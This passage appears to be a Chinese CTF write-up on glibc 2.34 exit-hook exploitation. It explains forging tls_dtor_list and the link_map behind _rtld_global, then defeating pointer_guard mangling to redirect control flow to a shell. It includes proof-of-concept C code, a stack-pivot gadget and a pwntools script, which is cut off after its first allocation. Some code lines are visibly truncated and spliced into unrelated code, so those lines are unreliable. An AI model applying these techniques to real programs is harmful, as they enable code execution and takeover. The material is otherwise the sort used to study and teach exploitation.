        }
      if (run_list_atexit)
        RUN_HOOK (__libc_atexit, ());
      _exit (status);
    }
    pwndbg> directory /usr/src/glibc/glibc-2.34/elf/
    pwndbg> directory /usr/src/glibc/glibc-2.34/stdlib
## 编写测试代码
测试机的环境是`Ubuntu 21.10`，地址随机化关闭
###  第一部分
####  `__call_tls_dtors`利用思路
可以先看看源代码，还有对应结构体。
    void
    __call_tls_dtors (void)
    {
      while (tls_dtor_list)
        {
          struct dtor_list *cur = tls_dtor_list;
          dtor_func func = cur->func;
    #ifdef PTR_DEMANGLE
          PTR_DEMANGLE (func);
    #endif
          tls_dtor_list = tls_dtor_list->next;
          func (cur->obj);
          .........
    struct dtor_list
    {
      dtor_func func;
      void *obj;
      struct link_map *map;
      struct dtor_list *next;
    };
    static __thread struct dtor_list *tls_dtor_list;
思路确实和简单，伪造`dtor_list`结构体，将结构体地址写入`tls_dtor_list`，使得其不为空，然后调用`func
(cur->obj);`。但是还有一步，就是`PTR_DEMANGLE
(func);`这个操作，这里要讲一下在`linux`里有一种线程局部存储机制，简称`TLS`它主要存储着一个线程的一些全局变量，包括我们熟知的canary也存储在里面，我们可以看看对应结构。
    typedef struct
    {
      void *tcb;        /* Pointer to the TCB.  Not necessarily the
                   thread descriptor used by libpthread.  */
      dtv_t *dtv;
      void *self;        /* Pointer to the thread descriptor.  */
      int multiple_threads;
      int gscope_flag;
      uintptr_t sysinfo;
      uintptr_t stack_guard;
      uintptr_t pointer_guard;
      unsigned long int unused_vgetcpu_cache[2];
      /* Bit 0: X86_FEATURE_1_IBT.
         Bit 1: X86_FEATURE_1_SHSTK.
       */
      unsigned int feature_1;
      int __glibc_unused1;
      /* Reservation of some values for the TM ABI.  */
      void *__private_tm[4];
      /* GCC split stack support.  */
      void *__private_ss;
      /* The lowest address of shadow stack,  */
      unsigned long long int ssp_base;
      /* Must be kept even if it is no longer used by glibc since programs,
         like AddressSanitizer, depend on the size of tcbhead_t.  */
      __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));
      void *__padding[8];
    } tcbhead_t;//在/sysdeps/x86_64/nptl/tls.h里
我们可以gdb调试看看对应的汇编代码
       0x7ffff7dd1de8 :    ror    rax,0x11
       0x7ffff7dd1dec :    xor    rax,QWORD PTR fs:0x30
       0x7ffff7dd1df5 :    mov    QWORD PTR fs:[rbx],rdx
       0x7ffff7dd1df9 :    mov    rdi,QWORD PTR [rbp+0x8]
       0x7ffff7dd1dfd :    call   rax
可以看到`PTR_DEMANGLE
(func);`这操作主要是先进行循环右移0x11位，再与fs:0x30（tcbhead_t->pointer_guard）进行异或，最终得到的数据就是我们的函数指针，所以我们只需进行逆操作就可以控制函数地址。
       system_addr=system_addr^pointer_guard;//system函数地址
       fuke_tls_dtor_list_addr[0]=((system_addr>>(64-0x11))|(system_addr
    #include 
    void backdoor() {
       puts("you hacked me!!");
       system("/bin/sh");
    }
    int main() {
       puts("let's do it.");
       size_t system_addr = &system;
       size_t libc_base = &puts - 0x84ed0;
       size_t *pointer_guard_addr;
       pointer_guard_addr = libc_base-0x2890;
       size_t pointer_guard = *pointer_guard_addr;
       size_t *tls_dtor_list_addr;
       char *ptr = malloc(0x450);
       size_t *fuke_tls_dtor_list_addr = (size_t *)ptr;//chunk_addr
       tls_dtor_list_addr = libc_base - 0x2918; 
       *tls_dtor_list_addr = fuke_tls_dtor_list_addr;//将chunk地址写入tls_dtor_list指针里（原本为空）
       system_addr=system_addr^pointer_guard;//system函数地址
       fuke_tls_dtor_list_addr[0]=((system_addr>>(64-0x11))|(system_addrl_info[DT_FINI_ARRAY] != NULL)
                {
                  ElfW(Addr) *array =
                    (ElfW(Addr) *) (l->l_addr
                            + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
                  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
                            / sizeof (ElfW(Addr)));
                  while (i-- > 0)
                    ((fini_t) array[i]) ();
                }
    ...............
    }
首先是伪造`rtld_global`结构体里的`link_map`结构体指针即`rtld_global->_ns_loaded`，为了不破坏`link_map`链表的完整性，因为后面有一次断言判断：检测链表的长度，上面也讲了
    void
    _dl_fini (void)
    {
    ......
            for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next)
            /* Do not handle ld.so in secondary namespaces.  */
            if (l == l->l_real)
              {
            assert (i l_idx = i;
            ++i;
            /* Bump l_direct_opencount of all objects so that they
               are not dlclose()ed from underneath us.  */
            ++l->l_direct_opencount;
              }
          assert (ns != LM_ID_BASE || i == nloaded);
          assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);
    .......
    }
所以我们结构体里的`link_map`指针`l_next`要保持不变而且`link_map`结构体`l`里面的`l_real`即`l->l_real`要指向它本身的地址。
    fuke_rtld_global_ptr_addr[1]=libc_base+0x2767d0;//link_map->l_next
    fuke_rtld_global_ptr_addr[5]=fuke_rtld_global_ptr_addr;//make l == l->l_real
然后就是构造并调用我们伪造的函数
          for (i = 0; i l_init_called)
            {
              /* Make sure nothing happens if we are called twice.  */
              l->l_init_called = 0;
              /* Is there a destructor function?  */
              if (l->l_info[DT_FINI_ARRAY] != NULL
                  || (ELF_INITFINI && l->l_info[DT_FINI] != NULL))
                {
                  .............
                  /* First see whether an array is given.  */
                  if (l->l_info[DT_FINI_ARRAY] != NULL)
                {
                  ElfW(Addr) *array =
                    (ElfW(Addr) *) (l->l_addr
                            + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
                  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
                            / sizeof (ElfW(Addr)));
                  while (i-- > 0)
                    ((fini_t) array[i]) ();
                }
     .................
然后要使`link_map`结构体`l`里面的`l_init_called`即`l->l_init_called`为1。
    fuke_rtld_global_ptr_addr[0x63]=0x800000000;//make l->l_init_called==1
接下来要使得`l->l_info[DT_FINI_ARRAY] != NULL`即`l->l_info[26] !=
NULL`，我们可以看看array是怎么算的。
    ElfW(Addr) *array = (ElfW(Addr) *) (l->l_addr+l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
可以看看l->l_info[DT_FINI_ARRAY]里的指针对应的结构体
    typedef struct
    {
      Elf64_Sxword    d_tag;            /* Dynamic entry type */
      union
        {
          Elf64_Xword d_val;        /* Integer value */
          Elf64_Addr d_ptr;            /* Address value */
        } d_un;
    } Elf64_Dyn;//在elf/elf.h里
所以我们可以将`l->l_addr`改为堆块的地址（堆块地址指向我们的后门函数地址），然后将`l->l_info[DT_FINI_ARRAY]`里的指针指向对应结构体`Elf64_Dyn`，该结构体我们可以伪造，可以改结构体里的`d_ptr`为固定的值（比如`0x20`或是0）。我们这里伪造为0；然后就是选定一个可读的地址
就好了。
    fuke_rtld_global_ptr_addr[0x22]=&fuke_rtld_global_ptr_addr[0x40];//l->l_info[26]
然后就是满足循环条件，这里我们可以调汇编来看
所以我们可以伪造i为1
      fuke_rtld_global_ptr_addr[0x24]=&fuke_rtld_global_ptr_addr[0x2f];//is in l->l_info[28] ；make i == 1
      fuke_rtld_global_ptr_addr[0x30]=8;//make i == 1
最后就是将`l->l_addr`改为堆块的地址（堆块地址指向我们的后门函数地址）
     fuke_rtld_global_ptr_addr[0] = &fuke_rtld_global_ptr_addr[0x20];//l->l_addr is a pointer of backdoor
     fuke_rtld_global_ptr_addr[0x20] = backdoor;
####  最终代码
    #include 
    #include 
    void backdoor() {
       puts("you hacked me");
       system("/bin/sh");
    }
    int main() {
       puts("let's do it.");
       size_t libc_base = &puts - 0x84ed0;
       size_t *_rtld_global_ptr_addr;//
       char *ptr = malloc(0x450);
       _rtld_global_ptr_addr = libc_base + 0x275040;
       size_t *fuke_rtld_global_ptr_addr = (size_t *)ptr;//fuke rtld_global->_ns_loaded
       *_rtld_global_ptr_addr = fuke_rtld_global_ptr_addr;
       fuke_rtld_global_ptr_addr[3]=libc_base+0x2767d0; //link_map->l_next
       fuke_rtld_global_ptr_addr[5]=fuke_rtld_global_ptr_addr;//make l == l->l_real
       fuke_rtld_global_ptr_addr[0x63]=0x800000000;//make l->l_init_called==1
       fuke_rtld_global_ptr_addr[0x22]=&fuke_rtld_global_ptr_addr[0x30];//l->l_info[26]
       fuke_rtld_global_ptr_addr[0x24]=&fuke_rtld_global_ptr_addr[0x2f];//make i == 1
       fuke_rtld_global_ptr_addr[0x30]=8;//make i == 1
       fuke_rtld_global_ptr_addr[0] = &fuke_rtld_global_ptr_addr[0x20];//l->l_addr a pointer of backdoor
       fuke_rtld_global_ptr_addr[0x20] = backdoor;
       return 0;
       }
## 实例利用
###  题目分析
魔改的2021湖湘杯2.34的pwn（将原来的_exit改成exit），chunk申请范围是0x40f到0x500，漏洞是uaf
这里地址随机化是开了的
###  方法一攻击原理
通过两次`largebin
attack`将已知地址写入结构体指针`tls_dtor_list`和`fs:0x30（tcbhead_t->pointer_guard）`里，然后风水布置堆块，伪造`dtor_list`结构体，接下来就是利用`__call_tls_dtors`函数来调用我们的指针，这里找到了不错的gadget
    0x0000000000169e90 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
可以通过`rdi`控制`rdx`，再调用`setcontext+61`进行栈迁移，`orw`读出flag。
###  exp
    #!/usr/bin/env python3
    #coding=utf-8
    from pwn import*
    import os
    context.log_level = 'debug'
    context.arch='amd64'
    binary = './pwn' 
    main_arena = 2198624
    s = lambda buf: io.send(buf)
    sl = lambda buf: io.sendline(buf)
    sa = lambda delim, buf: io.sendafter(delim, buf)
    sal = lambda delim, buf: io.sendlineafter(delim, buf)
    shell = lambda: io.interactive()
    r = lambda n=None: io.recv(n)
    ra = lambda t=tube.forever:io.recvall(t)
    ru = lambda delim: io.recvuntil(delim)
    rl = lambda: io.recvline()
    rls = lambda n=2**20: io.recvlines(n)
    su = lambda buf,addr:io.success(buf+"==>"+hex(addr))
    #context.terminal = ['tilix', '-x', 'sh', '-c']
    #context.terminal = ['tilix', 'splitw', '-v']
    local = 1
    if local == 1:
        io=process(binary)
    else:
        io=remote()
    elf=ELF(binary)
    #libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    def add(index,size,flag=1):
        pay = b'\x01'
        pay += p8(index)
        pay += p16(size)
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    def free(index,flag=1):
        pay = b'\x02'
        pay += p8(index)
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    def show(index,flag=1):
        pay = b'\x03'
        pay += p8(index)
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    def edit(index,size,content,flag=1):
        pay = b'\x04'
        pay += p8(index)
        pay += p16(size)
        pay += content
        if flag == 1:
            pay += b'\x05'
            ru("Pls input the opcode\n")
            s(pay)
        else:
            return pay
    add(0,0x410)#0